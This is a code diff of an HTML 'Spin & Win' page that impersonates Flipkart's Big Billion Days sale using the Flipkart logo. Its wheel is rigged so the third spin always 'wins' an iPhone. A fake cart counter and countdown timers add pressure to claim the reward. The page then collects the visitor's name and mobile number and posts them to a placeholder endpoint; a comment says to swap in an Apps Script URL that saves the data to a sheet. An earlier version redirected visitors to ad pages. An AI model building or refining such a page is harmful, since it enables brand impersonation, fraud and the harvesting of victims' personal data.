@@ -21,11 +21,16 @@
       font-weight: bold;
       display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 10px;
+      justify-content: space-between;
     }
     header img { height: 36px; }
-    header span { color: #ffeb3b; }
+    .cart {
+      font-size: 1em;
+      background: #ffeb3b;
+      color: #2874f0;
+      padding: 4px 10px;
+      border-radius: 12px;
+    }
 
     .wheel-container {
       position: relative;
@@ -33,7 +38,6 @@
       width: 320px;
       height: 320px;
     }
-
     .wheel {
       width: 100%;
       height: 100%;
@@ -50,7 +54,6 @@
       transition: transform 4s ease-out;
       position: relative;
     }
-
     .pointer {
       width: 0;
       height: 0;
@@ -62,7 +65,6 @@
       left: 50%;
       transform: translateX(-50%);
     }
-
     .label {
       position: absolute;
       width: 80px;
@@ -87,28 +89,34 @@
       margin-top: 20px;
     }
 
-    .ads {
-      margin: 20px auto;
-      width: 320px;
-      height: 100px;
-      border: 2px dashed #aaa;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #555;
-      background: #fff;
-    }
-
     .hidden { display: none; }
 
     #result {
-      font-size: 1.6em;
+      font-size: 1.4em;
       color: #d32f2f;
       font-weight: bold;
       margin-top: 20px;
     }
 
-    #userForm { margin: 20px auto; display: block; }
+    #claimSection {
+      margin: 40px auto;
+    }
+    #claimBtn {
+      display: none;
+      background: #2874f0;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.2em;
+      margin-top: 20px;
+    }
+
+    #userForm {
+      margin: 20px auto;
+      display: none;
+    }
     input {
       padding: 10px;
       margin: 8px;
@@ -125,98 +133,68 @@
       cursor: pointer;
       font-size: 1em;
     }
-
-    #claimBtn {
-      display: none;
-      background: #2874f0;
-      color: white;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1.2em;
-      margin-top: 20px;
-    }
   </style>
 </head>
 <body>
 
   <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo">
-    <span>Big Billion Days – Spin & Win 🎡</span>
+    <div><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo"></div>
+    <div><span>Big Billion Days – Spin & Win 🎡</span></div>
+    <div class="cart" id="cart">Cart: 0</div>
   </header>
 
-  <p>Enter your details to get <b>3 Spins</b> and win exciting prizes 🎁</p>
+  <p>You have <b>3 Spins</b>. Win exciting prizes 🎁</p>
 
-  <form id="userForm">
-    <input type="text" id="name" placeholder="Enter your name" required><br>
-    <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
-    <button type="submit" id="submitBtn">Start Spinning</button>
-  </form>
-
-  <div class="wheel-container hidden" id="gameArea">
+  <div class="wheel-container" id="gameArea">
     <div class="pointer"></div>
     <div id="wheel" class="wheel">
       <div class="label" style="transform: rotate(30deg) translateY(-120px);">iPhone</div>
       <div class="label" style="transform: rotate(90deg) translateY(-120px);">iPad</div>
-      <div class="label" style="transform: rotate(150deg) translateY(-120px);">EarPods</div>
+      <div class="label" style="transform: rotate(150deg) translateY(-120px);">PS5</div>
       <div class="label" style="transform: rotate(210deg) translateY(-120px);">Smartwatch</div>
       <div class="label" style="transform: rotate(270deg) translateY(-120px);">Nothing</div>
       <div class="label" style="transform: rotate(330deg) translateY(-120px);">Speaker</div>
     </div>
   </div>
 
-  <button id="spinBtn" class="spin-btn hidden">🎡 Spin Now</button>
-  <button id="claimBtn">Claim Prize</button>
-
+  <button id="spinBtn" class="spin-btn">🎡 Spin Now</button>
   <div id="result"></div>
 
-  <div class="ads">[Ad Slot 1]</div>
-  <div class="ads">[Ad Slot 2]</div>
-  <div class="ads">[Ad Slot 3]</div>
+  <div id="claimSection">
+    <p id="claimMsg"></p>
+    <button id="claimBtn">Claim Reward</button>
+  </div>
+
+  <!-- User form after first win -->
+  <form id="userForm">
+    <input type="text" id="name" placeholder="Enter your name" required><br>
+    <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
+    <button type="submit" id="submitBtn">Submit</button>
+  </form>
 
   <script>
-    const form = document.getElementById("userForm");
-    const gameArea = document.getElementById("gameArea");
     const wheel = document.getElementById("wheel");
     const spinBtn = document.getElementById("spinBtn");
-    const claimBtn = document.getElementById("claimBtn");
     const result = document.getElementById("result");
+    const claimMsg = document.getElementById("claimMsg");
+    const claimBtn = document.getElementById("claimBtn");
+    const cart = document.getElementById("cart");
+    const userForm = document.getElementById("userForm");
 
     let spins = 0;
     let hasWon = false;
-
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      const name = document.getElementById("name").value;
-      const mobile = document.getElementById("mobile").value;
-
-      // Dummy safe fetch for GitHub Pages (replace with real Apps Script URL later)
-      try {
-        fetch("https://httpbin.org/post", {
-          method: "POST",
-          body: JSON.stringify({ name, mobile }),
-          headers: { "Content-Type": "application/json" }
-        });
-      } catch (err) {
-        console.log("Form submit error:", err);
-      }
-
-      form.style.display = "none";
-      gameArea.classList.remove("hidden");
-      spinBtn.classList.remove("hidden");
-    });
+    let userSubmitted = false;
 
     spinBtn.addEventListener("click", () => {
       spins++;
       let degree;
 
       if (spins === 1) {
-        degree = 1800 + 270; // lands on "Nothing"
+        degree = 1800 + 270; // Always fail (Nothing)
       } else if (spins === 2) {
-        degree = 1800 + Math.floor(Math.random() * 360);
+        degree = 1800 + 90; // iPad (not iPhone)
       } else {
-        degree = 1800 + 30; // lands on iPhone
+        degree = 1800 + 30; // iPhone
         hasWon = true;
       }
 
@@ -224,28 +202,65 @@
 
       setTimeout(() => {
         if (spins === 1) {
-          result.textContent = "❌ Oops, try again after the ad!";
+          result.textContent = "❌ Oops! No luck this time.";
         } else if (spins === 2) {
-          result.textContent = "Almost there! Watch another ad...";
-        } else if (spins === 3) {
-          result.textContent = hasWon
-            ? "🎉 Congratulations! You won 🎁"
-            : "❌ Better luck next time!";
-          spinBtn.style.display = "none";
-          claimBtn.style.display = "inline-block";
+          result.textContent = "Almost there! You got iPad.";
+        } else {
+          result.textContent = "🎉 Congratulations! You won an iPhone 🎁";
         }
 
-        if (spins < 3) {
-          setTimeout(() => {
-            window.location.href = "https://example.com/ad-page";
-          }, 2000);
+        // Show claim message after each spin
+        claimMsg.textContent = "Scroll down to claim your reward ⬇️";
+        claimBtn.style.display = "inline-block";
+        claimBtn.disabled = true;
+
+        // Start 10s countdown
+        let time = 10;
+        claimBtn.textContent = `Claim Reward (${time})`;
+        const timer = setInterval(() => {
+          time--;
+          claimBtn.textContent = `Claim Reward (${time})`;
+          if (time === 0) {
+            clearInterval(timer);
+            claimBtn.disabled = false;
+            claimBtn.textContent = "Claim Reward";
+          }
+        }, 1000);
+
+        window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
+
+        if (spins >= 3) {
+          spinBtn.disabled = true;
         }
       }, 4000);
     });
 
     claimBtn.addEventListener("click", () => {
-      result.textContent = "✅ We will reach back to you soon!";
+      let cartCount = parseInt(cart.textContent.replace("Cart: ", ""));
+      cart.textContent = `Cart: ${cartCount + 1}`;
       claimBtn.style.display = "none";
+
+      // Ask user details only once
+      if (hasWon && !userSubmitted) {
+        userForm.style.display = "block";
+      }
+    });
+
+    userForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const mobile = document.getElementById("mobile").value;
+
+      // Save to Google Sheet (replace URL with your Apps Script)
+      fetch("https://httpbin.org/post", {
+        method: "POST",
+        body: JSON.stringify({ name, mobile }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      alert("✅ Submitted successfully!");
+      userForm.style.display = "none";
+      userSubmitted = true;
     });
   </script>
 </body>
